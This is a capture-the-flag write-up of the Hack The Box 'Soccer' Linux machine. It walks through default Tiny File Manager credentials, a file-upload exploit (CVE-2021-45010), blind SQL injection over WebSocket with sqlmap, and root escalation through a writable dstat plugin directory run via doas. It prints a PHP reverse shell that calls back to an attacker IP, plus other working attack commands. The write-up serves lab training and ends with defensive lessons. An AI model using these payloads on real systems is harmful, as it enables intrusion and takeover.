---
icon: futbol
---

# HTB-SOCCER

<figure><img src="../../../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

## HTB Soccer - Full Writeup (Linux | Easy)

This write-up documents the complete compromise of the Hack The Box "Soccer" machine, an easy-difficulty Linux box. The attack path involves exploiting default credentials, a vulnerable file upload (CVE-2021-45010), a blind SQL injection via WebSockets, and privilege escalation using a misconfigured `doas` SUID binary with a writable `dstat` plugin directory. Each step is detailed for clarity and reproducibility.

***

### 1. Initial Enumeration

#### Tools Used

* `nmap`
* `gobuster`
* Web browser
* `/etc/hosts` manipulation

#### Steps

#### 1.1 Full Port Scan with Nmap

Perform a full TCP port scan to identify open ports and services.

```bash
rustscan -a 10.10.11.194--ulimit 5000 --range 1-1000 -- -sCV -Pn

```

**Output:**

* 22/tcp: OpenSSH 8.2p1 (Ubuntu)
* 80/tcp: Nginx 1.18.0 (Ubuntu), redirects to `http://soccer.htb/`
* 9091/tcp: Unknown service (later identified as WebSocket)

#### 1.2 Add Domain to `/etc/hosts`

The HTTP service redirects to `soccer.htb`. Add it to the hosts file to resolve the domain.

```bash
echo "10.10.11.194 soccer.htb" | sudo tee -a /etc/hosts

```

#### 1.3 Directory Enumeration with Gobuster

Scan for directories and files on `http://soccer.htb`.

```bash
gobuster dir -u <http://soccer.htb> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```

**Found:**

* `/tiny` (Status: 301, redirects to `http://soccer.htb/tiny/`)

Navigating to `/tiny` reveals a Tiny File Manager login panel.

***

### 2. Initial Foothold

#### Goal

Gain a shell as `www-data` using default credentials and a vulnerable file upload in Tiny File Manager.

#### Steps

#### 2.1 Default Credentials for Tiny File Manager

Research on GitHub reveals default credentials for Tiny File Manager.

* URL: `http://soccer.htb/tiny/`
* Credentials:
  * Username: `admin`
  * Password: `admin@123`

Login successfully reveals Tiny File Manager version 2.4.3.

#### 2.2 Exploiting CVE-2021-45010

Tiny File Manager versions ≤ 2.4.6 are vulnerable to arbitrary file upload (CVE-2021-45010), allowing remote code execution (RCE) by uploading a malicious PHP file.

#### 2.3 Upload PHP Reverse Shell

Create a PHP reverse shell and upload it to the `/tiny/uploads` directory.

**Payload (`shell.php`):**

```php
<?php system('bash -c "bash -i >& /dev/tcp/10.10.14.40/4444 0>&1"'); ?>

```

* Navigate to the `/tiny/uploads` directory in the file manager.
* Upload `shell.php`.

#### 2.4 Set Up Listener

Start a netcat listener to catch the reverse shell.

```bash
nc -nlvp 4444

```

#### 2.5 Trigger the Shell

Visit the uploaded file to execute the reverse shell:

`http://soccer.htb/tiny/uploads/shell.php`

**Result:** A shell is received as the `www-data` user.

```bash
whoami
www-data

```

***

### 3. Enumeration as www-data

#### Goal

Identify additional attack vectors, such as subdomains or misconfigurations.

#### Steps

#### 3.1 Check Nginx Configuration

Inspect Nginx configuration files for subdomains.

```bash
ls -la /etc/nginx/sites-enabled/

```

**Output:**

```
lrwxrwxrwx 1 root root 34 Nov 17 00:06 default → /etc/nginx/sites-available/default
lrwxrwxrwx 1 root root 41 Nov 17 00:39 soc-player.htb → /etc/nginx/sites-available/soc-player.htb

```

Found subdomain: `soc-player.soccer.htb`.

#### 3.2 Update `/etc/hosts`

Add the subdomain to the hosts file.

```bash
echo "10.10.11.194 soc-player.soccer.htb" | sudo tee -a /etc/hosts

```

#### 3.3 Explore Subdomain

Visit `http://soc-player.soccer.htb`. The site offers Login and Signup functionality.

* Registering a new user grants access to a `/check` page displaying ticket information.
* No obvious vulnerabilities are found in the web interface.

***

### 4. Exploiting Blind SQL Injection (Port 9091)

#### Goal

Extract credentials from the database using a blind SQL injection on the WebSocket service.

#### Steps

#### 4.1 Identify Blind SQL Injection

The service on port 9091 is a WebSocket application (`soc-player.soccer.htb:9091`). Testing reveals a blind SQL injection vulnerability, where SQL logic can be injected, but query results are not directly visible.

#### 4.2 Use SQLMap to Exploit

Run `sqlmap` to automate the blind SQL injection and dump the database.

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch

```

**Output:**

* Database: `soccer_db`
* Credentials:
  * Username: `player`
  * Password: `PlayeroftheMatch2022`

***

### 5. SSH Access as player

#### Goal

Use the dumped credentials to gain SSH access as the `player` user.

#### Steps

#### 5.1 SSH Login

Connect to the target using the credentials.

```bash
ssh player@10.10.11.194

```

* Password: `PlayeroftheMatch2022`

**Result:** Successful login as `player`.

#### 5.2 Retrieve User Flag

Locate and read the user flag.

```bash
cat /home/player/user.txt

```

***

### 6. Privilege Escalation via `doas` + `dstat`

#### Goal

Escalate to `root` by exploiting a misconfigured `doas` binary and writable `dstat` plugin directory.

#### Steps

#### 6.1 Find SUID Binaries

Search for files with the SUID bit set.

```bash
find / -type f -perm -4000 2>/dev/null

```

**Output:**

```
/usr/local/bin/doas
/usr/lib/snapd/snap-plugin
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
...

```

The `/usr/local/bin/doas` binary is notable as an alternative to `sudo`.

#### 6.2 Inspect `doas` Configuration

Check the `doas` configuration file.

```bash
cat /usr/local/etc/doas.conf

```

**Output:**

```
permit nopass player as root cmd /usr/bin/dstat

```

The `player` user can run `dstat` as `root` without a password.

#### 6.3 Investigate `dstat` Plugins

Read the `dstat` manual to understand plugin functionality.

```bash
man dstat

```

**Key Information:**

* `dstat` supports Python plugins in directories like `/usr/local/share/dstat/`.
* Plugins must be prefixed with `dstat_`.

Check permissions of the plugin directory:

```bash
ls -ld /usr/local/share/dstat/

```

**Output:**

```
drwxrwx--- 2 root player 4096 Dec 12 14:53 /usr/local/share/dstat/

```

The directory is writable by the `player` group, to which the `player` user belongs.

#### 6.4 Create Malicious Plugin

Create a Python plugin to spawn a root shell.

```bash
echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py

```

#### 6.5 Verify Plugin Detection

List available `dstat` plugins to confirm the malicious plugin is recognized.

```bash
doas /usr/bin/dstat --list

```

**Output:** The `pwn` plugin is listed, confirming detection.

#### 6.6 Execute Plugin

Run `dstat` with the malicious plugin to spawn a root shell.

```bash
doas /usr/bin/dstat --pwn

```

**Result:** A root shell is obtained.

```bash
whoami
root

```

Retrieve the root flag:

```bash
cat /root/root.txt

```

***

### Final Summary

| Step                 | Technique                                                                                |
| -------------------- | ---------------------------------------------------------------------------------------- |
| Enumeration          | Port scanning, directory enumeration, subdomain discovery via Nginx configs              |
| Foothold             | Default credentials (`admin:admin@123`) + CVE-2021-45010 (Tiny File Manager file upload) |
| SQL Injection        | Blind SQL injection via WebSocket on port 9091, dumped credentials with `sqlmap`         |
| SSH Access           | SSH with `player:PlayeroftheMatch2022`                                                   |
| Privilege Escalation | Exploited `doas` misconfiguration and writable `dstat` plugin directory                  |

***

### Lessons Learned

* Default Credentials: Always change default credentials in production environments.
* Input Validation: Restrict WebSocket and API inputs to prevent SQL injection.
* SUID Binaries: Regularly audit SUID binaries and `doas`/`sudo` configurations.
* Plugin Directories: Ensure plugin directories are not writable by low-privileged users.

<figure><img src="../../../../.gitbook/assets/complete (5).gif" alt=""><figcaption></figcaption></figure>
